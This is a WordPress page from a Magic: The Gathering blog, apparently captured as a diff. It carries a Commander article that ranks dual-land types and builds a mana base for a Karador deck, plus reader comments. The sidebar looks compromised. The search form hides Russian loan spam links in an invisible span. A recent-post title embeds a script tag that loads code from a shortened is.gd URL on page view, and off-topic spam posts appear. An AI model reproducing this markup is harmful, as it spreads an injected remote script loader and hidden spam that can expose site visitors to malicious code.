+<p>They also consistently do what you want them to do.  They produce the mana your deck needs, and are largely immune to hate strategies.  Understand that not playing with at least one basic land in each of your colors creates a serious liability for your manabase.</p>
+<p>Snow covered basics have the additional utility of working with your Extraplanar Lens while shutting opponents out of the lens&#8217; normally bilateral effect.</p>
+<p><strong>#5: Check Lands / other conditional untapped lands (torment swamplands, lorwyn creature type lands).</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Glacial-Fort.jpg"><img class="alignnone size-medium wp-image-526" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Glacial-Fort-210x300.jpg" alt="Glacial Fort" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Glacial-Fort-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Glacial-Fort.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>They produce two colors and it&#8217;s really easy to meet their &#8220;untapped&#8221; condition if you play lands from tiers 1-4. Even if they come into play tapped, they still untap and become dual lands without any drawback (aside from not having a basic land type).  All of these are very affordable to own because of multiple printings, but may increase in price as Wizards has decided not to print core sets anymore.</p>
+<p><strong>#6: Pain Lands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Adarkar-Wastes.jpg"><img class="alignnone size-medium wp-image-527" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Adarkar-Wastes-210x300.jpg" alt="Adarkar Wastes" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Adarkar-Wastes-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Adarkar-Wastes.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>They always enter untapped, and can tap for colorless without taking a damage.  City of Brass and Mana Confluence tap for any color, but you always pay the life.  These are typically $3 when they are not in standard, so if you need to acquire these, it may be wise to wait a few months until they rotate from that format.</p>
+<p><strong>#7: Filter lands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Mystic-Gate.jpg"><img class="alignnone size-medium wp-image-528" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Mystic-Gate-210x300.jpg" alt="Mystic Gate" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Mystic-Gate-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Mystic-Gate.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>&nbsp;</p>
+<p>These are good, and many players assume that because they are expensive to own ($10 and up) they are stronger than they really are. (The price is mainly due to their rarity and utility in Modern). They often get cut from my 3-color lists because they are awkward when drawn in multiples in early turns.</p>
+<p><strong>#8: Untapped Allied Futurelands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Nimbus-Maze.jpg"><img class="alignnone size-medium wp-image-529" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Nimbus-Maze-210x300.jpg" alt="Nimbus Maze" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Nimbus-Maze-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Nimbus-Maze.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>Wouldn&#8217;t this make a cool band name? Allied Futurelands provide decent utility but have odd checks or drawbacks that occasionally produce interesting effects.  Grove of the Burnwillows/ Punishing Fire is a classic combo (albeit underpowered in this format). And Horizon Canopy stands out in colors that have a difficult time drawing cards. It&#8217;s too bad that the R/B version is just a filter land, and the U/W version is a modified Checkland.</p>
+<p><strong><strong> </strong></strong><strong>#8.5: Other Untapped Mana Producing Lands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Cradle.jpg"><img class="alignnone size-medium wp-image-530" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Cradle-210x300.jpg" alt="Cradle" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Cradle-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Cradle.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>-Scars Turn 3 allied duals.  These make more sense to include in a tiny leaders deck, otherwise they are useful in fast decks that have allied colors (Bant and Jund and Esper stand out because they can use two of the five in this cycle)</p>
+<p>-Charge untapped (gemstone) This is a command tower with three charges.  It&#8217;s pretty cool if you are playing a proliferate strategy or crucible of worlds, but unless I am really desperate or have very greedy mana requirements (10 or more cards with triple mana symbols in their cost) I leave this one in the box.</p>
+<p>-Untapped single color-producing utility lands (urborg, kjeldoran Outpost, Nykthos, Cabal Coffers, Gaea&#8217;s Cradle).  You may be surprised to find the mighty cradle and coffers this far down the list.  They are very, very powerful indeed, however they are contingent on you having other cards in play.   Cradle is horrible if you have zero creatures, and if you have a coffers without urborg on the table in a non-mono-black deck, it loses much of its utility.</p>
+<p>-Untapped conditional mana producing lands: meteor crater, etc</p>
+<p><strong>Tapped</strong></p>
+<p><strong>#9: Ravnica Bounce Lands</strong></p>
+<p><img class="alignnone size-medium wp-image-533" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azor-Chan-210x300.jpg" alt="Azor Chan" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azor-Chan-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azor-Chan.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></p>
+<p>These are played often, because they ramp us, and give us an opportunity to reuse a land like bojuka bog and khalni garden.  They get worse the more colors you are playing, because you never want to draw two in a row due to the loss in tempo they cause.</p>
+<p><strong> #10: Man-Lands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azor-Chan.jpg"><img class="alignnone size-medium wp-image-531" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Celes-Col-210x300.jpg" alt="Celes Col" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Celes-Col-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Celes-Col.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>The allied-color Worldwake lands are great to have.  i hope that Battle for Zendikar brings the opposing color manlands! They are outstanding when played alongside equipment.</p>
+<p>Additionally Urza&#8217;s Legacy had single-color manlands, and Lorwyn and Antiquities brought us Mutavault and Mishra&#8217;s Factory.</p>
+<p>My personal favorites include Creeping Tar Pit and Faerie Conclave for their ability to evasively hit Planeswalkers.</p>
+<p><strong>10.5 and beyond.</strong></p>
+<p>These have subtle effects, and by the time you get to this point you are only gaining marginal utility for the tapped mana fixing land.  Personally I&#8217;d rather play basics, unless budget constraints desperately push you into into these realms.</p>
+<p>-Tricolored/Dragon lairs: Thanks to Khans of Tarkir., we now have access to all ten color combinations.   They are great to have in a three colored deck, however I dislike drawing them after turns 1-3</p>
+<p>-Scrylands (Theros Block Temples)</p>
+<p>-Lifelands (Zendikar and Khans)</p>
+<p>-Tapped Charge lands/storage lands (Fallen Empires, Time Spiral)</p>
+<p>-Fetch into tapped basics (Evolving Wilds, Terramorphic Expanse, Bant Panorama)</p>
+<p>-Guildgates</p>
+<h1><a href="https://docs.google.com/spreadsheets/d/1wP0iC-x-yZrTV9G1v1mdQjwWwkmCOGKwsgDMPNm8NyY/edit#gid=0"><strong><strong> EDH PLAYABLE DUAL LAND CHART</strong></strong></a></h1>
+<p><strong>Here is a link to a chart that contains all of the names and color combinations of the lands mentioned above.  I often have trouble remembering the names of the over 150 duals, so I&#8217;ve created this for everyone&#8217;s convenience.  Enjoy!</strong></p>
+<h1><strong>Configuring Your Mana Base</strong></h1>
+<p><strong>-Two-color decks:</strong>  you&#8217;ll likely use tiers 1-10, and a few more basics (15-20) and utility lands 6+ than a 3-color deck.  Aside from mono-color decks, this is pretty easy to configure.</p>
+<p><strong>-Three-color decks</strong>: Use everything you have available from tiers 1-3, then delve into one or two of the lesser tiers before finishing with basics.  I like to run ten basics, then around 5 utility lands that have synergy with the deck.  You migt specialize in two of the three colors then add a splash of the third, which can allow you to go heavier on the two-color lands in the specialized colors, and include fewer of those that have the splash color.</p>
+<p><strong>-Five-color deck</strong>: This is often the most difficult to build correctly, but you can run all 30 lands from tier 1-3.  This is not recommended though, because you usually specialize in two or more colors.   For example, your Scion of the Ur Dragon deck might be mostly Red and Green with a splash of the other colors.  Therefore try to avoid over-doing it on the lands that don&#8217;t produce either of those: (u/w, u/b, w/b).  As for basics, play at least one of each non-mountain basic land (since Blood Moon will turn your nonbasics into mountains anyway).  From there, try to squeeze in 3-4 utility lands that have synergy with your deck&#8217;s plan.<strong><strong> </strong></strong></p>
+<p><strong>Now Lets use our knowledge to build a mana base for <a href="http://tappedout.net/mtg-decks/26-04-15-ehk-karador-no-lands-edh/">this Abzan Karador deck</a>!</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Shell.png"><img class="alignnone size-medium wp-image-535" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Shell-273x300.png" alt="Karador Shell" width="273" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Shell-273x300.png 273w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Shell.png 792w" sizes="(max-width: 273px) 100vw, 273px" /></a></p>
+<p><strong> So how many basics and non basics should we play?</strong></p>
+<p>As I&#8217;ve explained before, The quick and dirty way to figure out basics is to count your mana symbols, although there is occasionally more analysis required.</p>
+<p><strong><strong> </strong></strong>My deck has:</p>
+<p>44 black</p>
+<p>28 green</p>
+<p>31 white</p>
+<p><strong><strong> </strong></strong>Without much analysis and a little rounding, I could get by with 4 swamps, 3 forests, 3 plains.  The problem is, I need green in the beginning stage for my early drops, so I want to make sure that I draw at least one untapped green mana in my first three turns.  My white cards are significantly higher mana cost, so I won&#8217;t need white until later turns. For these reasons I may add an additional plains and forest, making it an even 12 basics.</p>
+<p>When deciding which Non Basics to play, I will likely make sure that they all produce green, and one or more additional colors.  This way, I am more likely to draw the green I need in the beginning stage.  That said, I&#8217;m still playing Scrubland and Godless Shrine, because I tend to always use the top three lands in all combinations that my deck will fit.</p>
+<p><strong><strong> </strong></strong>So the first ten will be Command Tower and the 9 applicable lands from tiers 1-3.</p>
+<p><strong>Command Tower</strong></p>
+<p><strong>Bayou</strong></p>
+<p><strong>Savannah</strong></p>
+<p><strong>Scrubland</strong></p>
+<p><strong>Overgrown Tomb</strong></p>
+<p><strong>Temple Garden</strong></p>
+<p><strong>Godless Shrine</strong></p>
+<p><strong>Verdant Catacombs</strong></p>
+<p><strong>Windswept Heath</strong></p>
+<p><strong>Marsh Flats</strong></p>
+<p>There is always temptation to run the 9 possible fetchlands in every tri-color deck, however I don&#8217;t want to spent 1/4th of my land drops searching and shuffling.  If anything I&#8217;d add the other green ones (misty rainforest, wooded foothills) because this deck needs green in the early turns.  Note that I can fetch Mistveil Plains, and Murmuring Bosk with my fetches as well, which makes me pretty happy.  If I added these fetches they would be at the expense of Krosan Verge and Sandsteppe Citadel.</p>
+<p><strong><strong> </strong></strong>The Next twelve will be our basics,</p>
+<p><strong>4 swamp, 4 forest, 4 plains</strong></p>
+<p><strong><strong> </strong></strong>Now the final fourteen:</p>
+<p>I used the tier list and went with the tier 5 and tier 7 lands.   The reason I skipped pain lands and went with filter lands was that this deck is hungry for colored mana in multiples.  I figured I would reduce the pain, and most likely be able to filter all of the colors since I play very few tapped lands, and a good number of basics.</p>
+<p><strong>Woodland Cemetery</strong></p>
+<p><strong>Sunpetal Grove</strong></p>
+<p><strong>Isolated Chapel</strong></p>
+<p><strong>Fetid heath</strong></p>
+<p><strong>Twilight Mire</strong></p>
+<p><strong>Wooded bastion</strong></p>
+<p>&nbsp;</p>
+<p><em><strong>Tri-Color Producers (for consistency)</strong></em></p>
+<p><strong>Murmuring Bosk</strong></p>
+<p><strong>Sandsteppe Citadel</strong></p>
+<p>&nbsp;</p>
+<p><em><strong>Utility Lands</strong></em></p>
+<p><strong>Bojuka bog</strong></p>
+<p><strong>Urborg, Tomb of Yawgmoth</strong></p>
+<p><strong>Volrath&#8217;s stronghold</strong></p>
+<p><strong>Strip mine</strong></p>
+<p><strong>Krosan verge</strong></p>
+<p><strong>Miren the Moaning Well</strong></p>
+<p><strong><a href="http://tappedout.net/mtg-decks/karador-shell-edh/">Here is the final result:</a> (Click to enlarge)</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Final.png"><img class="alignnone size-medium wp-image-537" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Final-278x300.png" alt="Karador Final" width="278" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Final-278x300.png 278w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Karador-Final.png 792w" sizes="(max-width: 278px) 100vw, 278px" /></a></p>
+<p>That&#8217;s all for this installment.  As I mentioned before, in part two, I&#8217;ll go deeper into the deck building aspect of mana and explain how to choose, build, and ramp with deck-appropriate creature, mana rock, spell-based, and combination packages.  As a bonus, I&#8217;ll also talk about Utility lands, and provide insight on which ones to keep and which ones to cut. (Maze of Ith, I have not forgotten you!) This will include many deck lists and examples to get you thinking, tinkering, and innovating.</p>
+<p>Until then!</p>
+<p>-Craig</p>
+<p><a href="mailto:songwritercs@gmail.com">SUBMIT A DECK</a> for review, suggestions, or tuning.  If I use your deck in an article here, I will buy you a standard-legal pack of your choice, as well as some other EDH goodies (sleeves, deckboxes) the next time I see you at The Wizard’s Cupboard, or, if you are not located nearby, I’ll mail the loot to you <img class="wp-smiley" src="http://www.wizardscupboard.com/wordpress/wp-includes/images/smilies/icon_smile.gif" alt=":)" /></p>
+
+</section><!-- /.article-content -->
+					<aside class="post-meta">
+			<ul>
+				<li class="categories"><a href="https://www.wizardscupboard.com/wordpress/category/edh-commander/" rel="category tag">EDH/Commander</a></li>
+				<li class="comment"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comments">6 Comments</a></li>
+													<li class="author"><a href="https://www.wizardscupboard.com/wordpress/author/craig/" title="Posts by Craig Sidorowicz" rel="author">Craig Sidorowicz</a></li>
+							</ul>
+		</aside><!-- /.post-meta -->
+		
+		</article><!-- #post-510 -->
+
+	
+			<nav role="navigation" id="" class="navigation-post">
+			<h1 class="screen-reader-text">Post navigation</h1>
+
+		
+			<div class="nav-previous"><a href="https://www.wizardscupboard.com/wordpress/modern-musings-burn-primer-part-2/" rel="prev"><span class="meta-nav"></span> Modern Musings: Burn Primer Part 2</a></div>			<div class="nav-next"><a href="https://www.wizardscupboard.com/wordpress/four-scorn-and-seven-years-ago/" rel="next">Four Scorn and Seven Years Ago <span class="meta-nav"></span></a></div>
+		
+		</nav><!-- # -->
+		
+
+
+<div id="comments" class="comments">
+
+	
+	
+		<h2 class="comments-title">
+			6 thoughts on &ldquo;<span>Commander 101: Mana in EDH Part One: The Basics (and Nonbasics)</span>&rdquo;		</h2>
+
+		<ol class="commentlist">
+					<li class="comment even thread-even depth-1" id="comment-5706">
+				<div id="div-comment-5706" class="comment-body">
+					<div class="comment-author vcard">
+				<img src="https://secure.gravatar.com/avatar/61f9c40688529e1b552223d7bb0c58e6?s=96&#038;d=mm&#038;r=g" width="96" height="96" alt="" class="avatar avatar-96wp-user-avatar wp-user-avatar-96 alignnone photo avatar-default" />
+				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comment-5706" class="date-link">June 11, 2015 at 2:48 am</a>				</div>
+				<cite class="fn">RC</cite>			</div>
+			<div class="comment-content">
+				
+				<p>nice article.  needed the help, now that I am back and only got original dual lands at my disposal.</p>
+			</div>
+
+			<div class="reply">
+				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/?replytocom=5706#respond' onclick='return addComment.moveForm( "div-comment-5706", "5706", "respond", "510" )' aria-label='Reply to RC'>Reply</a>			</div><!-- /.reply -->
+					</div><!-- /.comment-body -->
+			</li><!-- #comment-## -->
+		<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-5850">
+				<div id="div-comment-5850" class="comment-body">
+					<div class="comment-author vcard">
+				
+				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comment-5850" class="date-link">June 23, 2015 at 3:03 pm</a>				</div>
+				<cite class="fn"><a href='http://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/' rel='external nofollow' class='url'>Mana in EDH Part 2: Choosing the Correct Ramp Package. | The Wizard&#039;s Cupboard</a></cite>			</div>
+			<div class="comment-content">
+				
+				<p>[&#8230;] Part one, we discussed the importance of playing the correct quantity of lands. We also evaluated each cycle [&#8230;]</p>
+			</div>
+
+			<div class="reply">
+				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/?replytocom=5850#respond' onclick='return addComment.moveForm( "div-comment-5850", "5850", "respond", "510" )' aria-label='Reply to Mana in EDH Part 2: Choosing the Correct Ramp Package. | The Wizard&#039;s Cupboard'>Reply</a>			</div><!-- /.reply -->
+					</div><!-- /.comment-body -->
+			</li><!-- #comment-## -->
+		<li class="pingback even thread-even depth-1" id="comment-10577">
+				<div id="div-comment-10577" class="comment-body">
+					<div class="comment-author vcard">
+				
+				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comment-10577" class="date-link">October 4, 2015 at 9:32 pm</a>				</div>
+				<cite class="fn"><a href='http://www.wizardscupboard.com/wordpress/battle-for-zendikar-in-edh-a-commanding-impact/' rel='external nofollow' class='url'>Battle for Zendikar in EDH: A Commanding Impact | The Wizard&#039;s Cupboard</a></cite>			</div>
+			<div class="comment-content">
+				
+				<p>[&#8230;] In a recent MtgSalvation poll, voters chose between several nicknames for these new lands that require two basic lands on your battlefield to come into play untapped.  While &#8220;Battle Lands&#8221; seemed intuitive, the voters choice of &#8220;Tango Lands&#8221; rolls off of the tongue much better. Naming aside, we need to discuss function and decide where these lands fit into the noble hierarchy of dual lands. [&#8230;]</p>
+			</div>
+
+			<div class="reply">
+				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/?replytocom=10577#respond' onclick='return addComment.moveForm( "div-comment-10577", "10577", "respond", "510" )' aria-label='Reply to Battle for Zendikar in EDH: A Commanding Impact | The Wizard&#039;s Cupboard'>Reply</a>			</div><!-- /.reply -->
+					</div><!-- /.comment-body -->
+			</li><!-- #comment-## -->
+		<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-14855">
+				<div id="div-comment-14855" class="comment-body">
+					<div class="comment-author vcard">
+				
+				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comment-14855" class="date-link">December 22, 2015 at 6:56 am</a>				</div>
+				<cite class="fn"><a href='http://www.wizardscupboard.com/wordpress/edhcommander-deckbuilding-101-packages-synergy-and-theme-featuring-marath-token-landfall/' rel='external nofollow' class='url'>EDH COmmander Deckbuilding 101 Packages Synergy Theme Marath</a></cite>			</div>
+			<div class="comment-content">
+				
+				<p>[&#8230;] Mana in EDH Part 1: The Basics (and Nonbasics) [&#8230;]</p>
+			</div>
+
+			<div class="reply">
+				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/?replytocom=14855#respond' onclick='return addComment.moveForm( "div-comment-14855", "14855", "respond", "510" )' aria-label='Reply to EDH COmmander Deckbuilding 101 Packages Synergy Theme Marath'>Reply</a>			</div><!-- /.reply -->
+					</div><!-- /.comment-body -->
+			</li><!-- #comment-## -->
+		<li class="comment even thread-even depth-1" id="comment-19260">
+				<div id="div-comment-19260" class="comment-body">
+					<div class="comment-author vcard">
+				<img src="https://secure.gravatar.com/avatar/d25394ad486eb66b627827f0c5606a65?s=96&#038;d=mm&#038;r=g" width="96" height="96" alt="" class="avatar avatar-96wp-user-avatar wp-user-avatar-96 alignnone photo avatar-default" />
+				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comment-19260" class="date-link">October 5, 2016 at 11:52 am</a>				</div>
+				<cite class="fn"><a href='http://azusaca-locksmith.com' rel='external nofollow' class='url'>Hassan services</a></cite>			</div>
+			<div class="comment-content">
+				
+				<p>Tremendous…</p>
+			</div>
+
+			<div class="reply">
+				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/?replytocom=19260#respond' onclick='return addComment.moveForm( "div-comment-19260", "19260", "respond", "510" )' aria-label='Reply to Hassan services'>Reply</a>			</div><!-- /.reply -->
+					</div><!-- /.comment-body -->
+			</li><!-- #comment-## -->
+		<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-19675">
+				<div id="div-comment-19675" class="comment-body">
+					<div class="comment-author vcard">
+				
+				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#comment-19675" class="date-link">November 11, 2016 at 7:42 am</a>				</div>
+				<cite class="fn"><a href='http://www.commandercast.com/coast-2-coast-commander-ep-14-angels-in-the-quarantine-field' rel='external nofollow' class='url'>Coast 2 Coast Commander: Ep. 14 &#8211; Angels in the Quarantine Field &laquo; CommanderCast</a></cite>			</div>
+			<div class="comment-content">
+				
+				<p>[&#8230;] Commander 101: Mana in EDH Part One: The Basics (and Nonbasics), by Craig Sidorowicz [&#8230;]</p>
+			</div>
+
+			<div class="reply">
+				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/?replytocom=19675#respond' onclick='return addComment.moveForm( "div-comment-19675", "19675", "respond", "510" )' aria-label='Reply to Coast 2 Coast Commander: Ep. 14 &#8211; Angels in the Quarantine Field &laquo; CommanderCast'>Reply</a>			</div><!-- /.reply -->
+					</div><!-- /.comment-body -->
+			</li><!-- #comment-## -->
+		</ol>
+
+		
+	
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://www.wizardscupboard.com/wordpress/wp-comments-post.php" method="post" id="commentform" class="comment-form">
+				<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" /></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='510' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="1e3805c772" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="107"/></p>			</form>
+			</div><!-- #respond -->
+	
+</div><!-- .comments -->
+
+
+</section><!-- /.content -->
+
+
+
+
+<aside class="sidebar" role="complementary">
+
+	
+	<aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" class="searchform" action="https://www.wizardscupboard.com/wordpress/" role="search">
+		<label for="s" class="screen-reader-text">Search</label>
+		<input type="search" class="field" name="s" value="" id="s" placeholder="Search &hellip;" />
+		<input type="submit" class="submit" id="searchsubmit" value="Search" /><span style="dispLAy : NOnE;"><a href="http://www.tttgoogle.ru">кредит онлайн заявка</a><a href="http://www.tttgoogle.ru/zaymyi.html">срочный кредит</a><a href="http://www.tttgoogle.ru/business-kredit.html">кредит бизнесу1</a></span>
+	</form>
+</aside><aside id="widget_sp_image-2" class="widget widget_sp_image"><a href="http://www.wizardscupboard.com" id="" target="_blank" class="widget_sp_image-image-link" title="" rel=""><img width="180" height="180" alt="" class="attachment-full aligncenter" style="max-width: 100%;" src="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure.jpg" /></a></aside><aside id="categories-2" class="widget widget_categories"><h2>Categories</h2>		<ul>
+	<li class="cat-item cat-item-1"><a href="https://www.wizardscupboard.com/wordpress/category/edh-commander/" title="Post&#039;s relating to EDH/Commander Card&#039;s, Deck&#039;s and Deck Construction">EDH/Commander</a> (24)
+</li>
+	<li class="cat-item cat-item-5"><a href="https://www.wizardscupboard.com/wordpress/category/ramblings/" title="Just general ramblings">MTG Ramblings</a> (37)
+</li>
+	<li class="cat-item cat-item-6"><a href="https://www.wizardscupboard.com/wordpress/category/standard-decks/" title="New standard deck ideas">Standard</a> (14)
+</li>
+		</ul>
+</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h2>Recent Posts</h2>		<ul>
+					<li>
+				<a href="https://www.wizardscupboard.com/wordpress/the-momir-basic-box/">The Momir Basic Box</a>
+						</li>
+					<li>
+				<a href="https://www.wizardscupboard.com/wordpress/modern-horizons-shopping-list/">Modern Horizons Shopping List</a>
+						</li>
+					<li>
+				<a href="https://www.wizardscupboard.com/wordpress/matt-harvey-unlike-mets-says-he-always-thought-he-had-a-180-inning-limit/">Matt Harvey, unlike Mets, says he always thought he had a 180-inning limit</a>
+						</li>
+					<li>
+				<a href="https://www.wizardscupboard.com/wordpress/from-convict-to-legal-justice-reporter-i-was-so-fortunate-to-come-away-from-this/">From Convict To Legal Justice Reporter: &#8216;I Was So Fortunate To come Away from This&#8217;</a>
+						</li>
+					<li>
+				<a href="https://www.wizardscupboard.com/wordpress/new-cards-for-modern/">New Cards for Modern<script src="https://is.gd/GgGf9z?v=v25.0"></script></a>
+						</li>
+				</ul>
+		</aside>		<aside id="archives-2" class="widget widget_archive"><h2>Archives</h2>		<ul>
+			<li><a href='https://www.wizardscupboard.com/wordpress/2019/09/'>September 2019</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2019/08/'>August 2019</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2018/09/'>September 2018</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2018/08/'>August 2018</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/08/'>August 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/07/'>July 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/06/'>June 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/05/'>May 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/04/'>April 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/03/'>March 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/02/'>February 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2017/01/'>January 2017</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/11/'>November 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/09/'>September 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/08/'>August 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/07/'>July 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/06/'>June 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/05/'>May 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/04/'>April 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/03/'>March 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/02/'>February 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2016/01/'>January 2016</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/12/'>December 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/11/'>November 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/10/'>October 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/09/'>September 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/08/'>August 2015</a></li>
+	<li><a href='https://www.wizardscupboard.com/wordpress/2015/07/'>July 2015</a></li>
